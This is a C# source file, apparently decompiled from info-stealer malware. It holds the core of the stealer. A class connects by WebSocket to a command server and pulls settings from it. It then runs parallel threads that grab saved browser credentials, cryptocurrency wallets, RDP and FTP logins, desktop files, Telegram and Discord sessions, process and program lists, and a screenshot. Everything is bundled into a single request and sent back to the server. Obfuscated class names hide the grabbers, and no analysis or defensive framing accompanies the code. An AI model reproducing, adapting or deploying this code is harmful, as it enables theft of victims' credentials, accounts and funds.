using NoiseMe.Drags.App.Data.Recovery;
using NoiseMe.Drags.App.DTO.Linq;
using NoiseMe.Drags.App.Models;
using NoiseMe.Drags.App.Models.Common;
using NoiseMe.Drags.App.Models.Communication;
using NoiseMe.Drags.App.Models.Credentials;
using NoiseMe.Drags.App.Models.Delegates;
using NoiseMe.Drags.App.Models.LocalModels;
using NoiseMe.Drags.App.Models.LocalModels.Extensions;
using NoiseMe.Drags.App.Models.LocalModels.Extensions.Nulls;
using NoiseMe.Drags.App.Models.Requests;
using NoiseMe.Drags.App.Models.WebSocket4Net;
using ProtoBuf.Meta;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Text;
using System.Threading;

namespace NoiseMe.Drags.App.Data.Srv
{
	public class Post
	{
		private int _typeIndex = 100;

		public EventHandler OnWorkCompleted;

		private readonly string BuildID;

		private readonly AutoResetEvent telegramFlag = new AutoResetEvent(initialState: false);

		private readonly AutoResetEvent discordFlag = new AutoResetEvent(initialState: false);

		private readonly AutoResetEvent processesFlag = new AutoResetEvent(initialState: false);

		private readonly AutoResetEvent programsFlag = new AutoResetEvent(initialState: false);

		private readonly AutoResetEvent browsersFlag = new AutoResetEvent(initialState: false);

		private readonly AutoResetEvent walletsFlag = new AutoResetEvent(initialState: false);

		private readonly AutoResetEvent rdpsFlag = new AutoResetEvent(initialState: false);

		private readonly AutoResetEvent desktopFlag = new AutoResetEvent(initialState: false);

		private readonly AutoResetEvent ftpFlag = new AutoResetEvent(initialState: false);

		private readonly AutoResetEvent clientInfoFlag = new AutoResetEvent(initialState: false);

		public Dictionary<Func<RequestBase, bool>, Action<RequestBase, WebSocket>> Handlers
		{
			get;
		}

		public string Host
		{
			get;
		}

		public WebSocket Server
		{
			get;
		}

		public bool Running
		{
			get;
			private set;
		}

		public IList<GH9kf<BrowserProfile>> BrowserCredentialsManagers
		{
			get;
		}

		public IList<GH9kf<ColdWallet>> ColdWalletManagers
		{
			get;
		}

		public IList<GH9kf<RdpCredential>> RdpManagers
		{
			get;
		}

		public IList<GH9kf<FtpCredential>> FtpManagers
		{
			get;
		}

		public IList<gg3> DesktopFileManagers
		{
			get;
		}

		public Post(string IP, string buildID)
		{
			RuntimeTypeModel.Default.AutoAddMissingTypes = true;
			AddTypesToSerializer(typeof(CommunicationObject), typeof(RequestBase), typeof(ResponseBase));
			AddTypeToSerializer(typeof(RequestBase), typeof(Request<CredentialsRequest>));
			AddTypeToSerializer(typeof(RequestBase), typeof(Request<string>));
			AddTypeToSerializer(typeof(ResponseBase), typeof(Response<bool>));
			AddTypeToSerializer(typeof(ResponseBase), typeof(Response<ClientSettings>));
			BrowserCredentialsManagers = new List<GH9kf<BrowserProfile>>
			{
				new Bip(),
				new hhhh6r()
			};
			ColdWalletManagers = new List<GH9kf<ColdWallet>>
			{
				new ColdIndetifier()
			};
			RdpManagers = new List<GH9kf<RdpCredential>>
			{
				new j6cd()
			};
			FtpManagers = new List<GH9kf<FtpCredential>>
			{
				new gg3d()
			};
			DesktopFileManagers = new List<gg3>
			{
				new gg3()
			};
			BuildID = buildID;
			Handlers = new Dictionary<Func<RequestBase, bool>, Action<RequestBase, WebSocket>>();
			Host = $"ws://{IP}:{2012}/websocket";
			Server = new WebSocket(Host)
			{
				AutoSendPingInterval = 5000,
				EnableAutoSendPing = true,
				AllowUnstrustedCertificate = true
			};
			InitializeSeIntIrver();
			Console.WriteLine("Server is initialized");
		}

		public TaskAction<bool> Piu()
		{
			return AsyncTask.StartNew(delegate
			{
				Server.Open();
				Console.WriteLine("Opening");
				while (!Running)
				{
					Thread.Sleep(100);
				}
				return true;
			});
		}

		public void HandleWorkCompleted()
		{
			OnWorkCompleted?.Invoke(this, null);
		}

		private void InitializeSeIntIrver()
		{
			Running = false;
			Server.DataReceived += delegate(object sender, NoiseMe.Drags.App.Models.WebSocket4Net.DataReceivedEventArgs arguments)
			{
				try
				{
					if (arguments.Data.IsNotNull() && arguments.Data.Length != 0)
					{
						CommunicationObject communicationObject = arguments.Data.DeSerializeProto<CommunicationObject>();
						RequestBase requestBase;
						if ((requestBase = (communicationObject as RequestBase)) != null)
						{
							foreach (KeyValuePair<Func<RequestBase, bool>, Action<RequestBase, WebSocket>> handler in Handlers)
							{
								if (handler.Key(requestBase))
								{
									handler.Value(requestBase, Server);
								}
							}
						}
						ResponseBase response;
						if ((response = (communicationObject as ResponseBase)) != null)
						{
							response.OnResponse();
						}
					}
				}
				catch (Exception arg)
				{
					Console.WriteLine("Invalid JsonMessage data from server. Exception : " + arg);
				}
			};
			Server.Opened += delegate
			{
				Running = true;
			};
			Server.MessageReceived += delegate(object sender, MessageReceivedEventArgs message)
			{
				Console.WriteLine(message.Message);
			};
			Server.Closed += delegate(object sender, EventArgs eventArgs)
			{
				Console.WriteLine("Closesd: " + eventArgs);
			};
			Server.Error += delegate
			{
				Running = false;
			};
		}

		public bool QQu()
		{
			try
			{
				ClientSettings settings = RecieveSettings().IsNull(new ClientSettings());
				List<BrowserProfile> browserProfiles = new List<BrowserProfile>();
				List<ColdWallet> wallets = new List<ColdWallet>();
				List<RdpCredential> rdpCredentials = new List<RdpCredential>();
				List<DesktopFile> desktopFiles = new List<DesktopFile>();
				List<FtpCredential> ftpCredentials = new List<FtpCredential>();
				TelegramSession telegramSession = new TelegramSession();
				DiscordSession discordSession = new DiscordSession();
				List<RemoteProcess> processes = new List<RemoteProcess>();
				List<string> programs = new List<string>();
				RemoteClientInformation clientInfo = new RemoteClientInformation();
				ThreadPool.SetMaxThreads(2000, 10000);
				new Thread((ThreadStart)delegate
				{
					Console.WriteLine("ClientInfos parser has been started");
					Stopwatch stopwatch10 = new Stopwatch();
					stopwatch10.Start();
					clientInfo = ClientInfoHelper.Create(BuildID);
					stopwatch10.Stop();
					clientInfoFlag.Set();
					Console.WriteLine($"ClientInfos has been parsed.Elapsed time: {stopwatch10.Elapsed}");
				}).Start();
				new Thread((ThreadStart)delegate
				{
					Console.WriteLine("Browsers parser has been started");
					Stopwatch stopwatch9 = new Stopwatch();
					stopwatch9.Start();
					if (settings.GrabBrowserCredentials)
					{
						int countCompleted = 0;
						object locker = new object();
						foreach (GH9kf<BrowserProfile> manager in BrowserCredentialsManagers)
						{
							new Thread((ThreadStart)delegate
							{
								List<BrowserProfile> collection = manager.EnumerateData();
								lock (locker)
								{
									browserProfiles.AddRange(collection);
									int num = countCompleted;
									countCompleted = num + 1;
								}
							}).Start();
						}
						while (countCompleted != BrowserCredentialsManagers.Count)
						{
						}
					}
					stopwatch9.Stop();
					browsersFlag.Set();
					Console.WriteLine($"Browsers has been parsed.Elapsed time: {stopwatch9.Elapsed}");
				}).Start();
				new Thread((ThreadStart)delegate
				{
					Console.WriteLine("ColdWallets parser has been started");
					Stopwatch stopwatch8 = new Stopwatch();
					stopwatch8.Start();
					if (settings.GrabColdWallets)
					{
						foreach (GH9kf<ColdWallet> coldWalletManager in ColdWalletManagers)
						{
							wallets.AddRange(coldWalletManager.EnumerateData().IsNull(new List<ColdWallet>()));
						}
					}
					stopwatch8.Stop();
					walletsFlag.Set();
					Console.WriteLine($"ColdWallets has been parsed.Elapsed time: {stopwatch8.Elapsed}");
				}).Start();
				new Thread((ThreadStart)delegate
				{
					Console.WriteLine("DiscordSession parser has been started");
					Stopwatch stopwatch7 = new Stopwatch();
					stopwatch7.Start();
					if (settings.GrabDiscord)
					{
						discordSession = fffsa.TempGet();
					}
					stopwatch7.Stop();
					discordFlag.Set();
					Console.WriteLine($"DiscordSession has been parsed.Elapsed time: {stopwatch7.Elapsed}");
				}).Start();
				new Thread((ThreadStart)delegate
				{
					Console.WriteLine("Rdps parser has been started");
					Stopwatch stopwatch6 = new Stopwatch();
					stopwatch6.Start();
					if (settings.GrabRdp)
					{
						foreach (GH9kf<RdpCredential> rdpManager in RdpManagers)
						{
							rdpCredentials.AddRange(rdpManager.EnumerateData().IsNull());
						}
					}
					stopwatch6.Stop();
					rdpsFlag.Set();
					Console.WriteLine($"Rdps has been parsed.Elapsed time: {stopwatch6.Elapsed}");
				}).Start();
				new Thread((ThreadStart)delegate
				{
					Console.WriteLine("DesktopFiles parser has been started");
					Stopwatch stopwatch5 = new Stopwatch();
					stopwatch5.Start();
					if (settings.GrabDesktopFiles)
					{
						foreach (gg3 desktopFileManager in DesktopFileManagers)
						{
							desktopFileManager.GrabberSettings = settings.DesktopExtensions;
							desktopFiles.AddRange(desktopFileManager.EnumerateData());
						}
					}
					stopwatch5.Stop();
					desktopFlag.Set();
					Console.WriteLine($"DesktopFiles has been parsed.Elapsed time: {stopwatch5.Elapsed}");
				}).Start();
				new Thread((ThreadStart)delegate
				{
					Console.WriteLine("FTPs parser has been started");
					Stopwatch stopwatch4 = new Stopwatch();
					stopwatch4.Start();
					if (settings.GrabFtp)
					{
						foreach (GH9kf<FtpCredential> ftpManager in FtpManagers)
						{
							ftpCredentials.AddRange(ftpManager.EnumerateData().IsNull());
						}
					}
					stopwatch4.Stop();
					ftpFlag.Set();
					Console.WriteLine($"FTPs has been parsed.Elapsed time: {stopwatch4.Elapsed}");
				}).Start();
				new Thread((ThreadStart)delegate
				{
					Console.WriteLine("TelegramSession parser has been started");
					Stopwatch stopwatch3 = new Stopwatch();
					stopwatch3.Start();
					if (settings.GrabTelegram)
					{
						telegramSession = Fkf83.Fuul();
					}
					stopwatch3.Stop();
					telegramFlag.Set();
					Console.WriteLine($"TelegramSession has been parsed.Elapsed time: {stopwatch3.Elapsed}");
				}).Start();
				new Thread((ThreadStart)delegate
				{
					Console.WriteLine("ListOfProcesses parser has been started");
					Stopwatch stopwatch2 = new Stopwatch();
					stopwatch2.Start();
					processes = ClientInfoHelper.ListOfProcesses();
					stopwatch2.Stop();
					processesFlag.Set();
					Console.WriteLine($"ListOfProcesses has been parsed.Elapsed time: {stopwatch2.Elapsed}");
				}).Start();
				new Thread((ThreadStart)delegate
				{
					Console.WriteLine("ListOfPrograms parser has been started");
					Stopwatch stopwatch = new Stopwatch();
					stopwatch.Start();
					programs = ClientInfoHelper.ListOfPrograms();
					stopwatch.Stop();
					programsFlag.Set();
					Console.WriteLine($"ListOfPrograms has been parsed.Elapsed time: {stopwatch.Elapsed}");
				}).Start();
				telegramFlag.WaitOne();
				discordFlag.WaitOne();
				processesFlag.WaitOne();
				programsFlag.WaitOne();
				browsersFlag.WaitOne();
				walletsFlag.WaitOne();
				rdpsFlag.WaitOne();
				desktopFlag.WaitOne();
				ftpFlag.WaitOne();
				clientInfoFlag.WaitOne();
				Console.WriteLine("CredentialsRequest has been created");
				if (clientInfo == null)
				{
					Environment.Exit(0);
				}
				CredentialsRequest objectToSend = new CredentialsRequest
				{
					ClientInformation = clientInfo,
					BrowserProfiles = browserProfiles,
					ColdWallets = wallets,
					RdpConnections = rdpCredentials,
					DesktopFiles = desktopFiles,
					FtpCredentials = ftpCredentials,
					Telegram = telegramSession,
					Discord = discordSession,
					ProcessList = processes,
					InstalledPrograms = programs,
					Screenshot = ClientInfoHelper.CaptureScreen()
				};
				return Server.ProcessRequest<CredentialsRequest, bool>(objectToSend, "Credentials", 600000)();
			}
			catch
			{
				return false;
			}
		}

		public ClientSettings RecieveSettings()
		{
			ClientSettings clientSettings = Server.ProcessRequest<string, ClientSettings>("", "ParseClientSettings", 600000)();
			clientSettings.DesktopExtensions = (clientSettings.DesktopExtensions ?? new BindingList<string>());
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.Append("GrabBrowserCredentials: ").Append(clientSettings.GrabBrowserCredentials).AppendLine()
				.Append("GrabColdWallets: ")
				.Append(clientSettings.GrabColdWallets)
				.AppendLine()
				.Append("GrabDesktopFiles: ")
				.Append(clientSettings.GrabDesktopFiles)
				.AppendLine()
				.Append("GrabFtp: ")
				.Append(clientSettings.GrabFtp)
				.AppendLine()
				.Append("GrabRdp: ")
				.Append(clientSettings.GrabRdp)
				.AppendLine()
				.Append("GrabDiscord: ")
				.Append(clientSettings.GrabDiscord)
				.AppendLine()
				.Append("GrabTelegram: ")
				.Append(clientSettings.GrabTelegram)
				.AppendLine()
				.Append("Extensions: ")
				.AppendLine(string.Join(new string(new char[1]
				{
					','
				}), clientSettings.DesktopExtensions.ToArray()));
			Console.WriteLine(stringBuilder.ToString());
			return clientSettings.IsNull(new ClientSettings());
		}

		public void AddTypeToSerializer(Type parent, Type type)
		{
			if (type == null || parent == null)
			{
				throw new ArgumentNullException();
			}
			if (!RuntimeTypeModel.Default[parent].GetSubtypes().Any((SubType subType) => subType.DerivedType.Type == type))
			{
				RuntimeTypeModel.Default[parent].AddSubType(_typeIndex++, type);
			}
		}

		public void AddTypesToSerializer(Type parent, params Type[] types)
		{
			foreach (Type type in types)
			{
				AddTypeToSerializer(parent, type);
			}
		}
	}
}
